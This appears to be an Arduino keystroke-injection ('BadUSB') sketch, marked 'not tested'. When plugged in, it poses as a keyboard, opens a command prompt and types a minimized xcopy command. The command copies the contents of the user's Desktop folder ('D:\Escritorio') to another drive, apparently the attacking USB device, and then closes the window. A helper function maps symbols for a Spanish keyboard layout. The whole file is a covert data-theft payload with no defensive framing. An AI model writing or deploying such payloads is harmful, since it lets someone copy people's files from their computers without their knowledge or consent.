/* -----------------
 *    not tested
 * ----------------- */

#include "Keyboard.h"

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void esp_print(String text){
  for (int i = 0; i<=text.length(); i++)
  {
      char val = text[i];
      if (val == ':'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print(".");
        Keyboard.releaseAll();
      }else if (val == '/'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print("7");
        Keyboard.releaseAll();
      }else if (val == '('){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("8");
          Keyboard.releaseAll();
      }else if (val == ')'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("9");
          Keyboard.releaseAll();
      }else if (val == '='){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("0");
          Keyboard.releaseAll();
      }else if (val == ';'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print(",");
          Keyboard.releaseAll();
      }else if (val == '"'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("2");
          Keyboard.releaseAll();
      }else if (val == '-'){
          Keyboard.print("/");
      }else if (val == '&'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("6");
          Keyboard.releaseAll();
      }else if (val == '\\'){
          Keyboard.press(KEY_RIGHT_ALT);
          Keyboard.print("`");
          Keyboard.releaseAll();
      }else{
        Keyboard.print(val);
      }
  }
}

void opencmd(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("cmd");
  delay(200);
  typeKey(KEY_RETURN);
  delay(500);
}

void exit(){
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
}

void setup(){
  Keyboard.begin();
  String orig = "D:\\Escritorio";
  String dest = "E:\\test";
  delay(500);
  opencmd();
  esp_print("START /MIN xcopy "+orig+" "+dest+" /e");
  typeKey(KEY_RETURN);
  delay(50);
  exit();
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
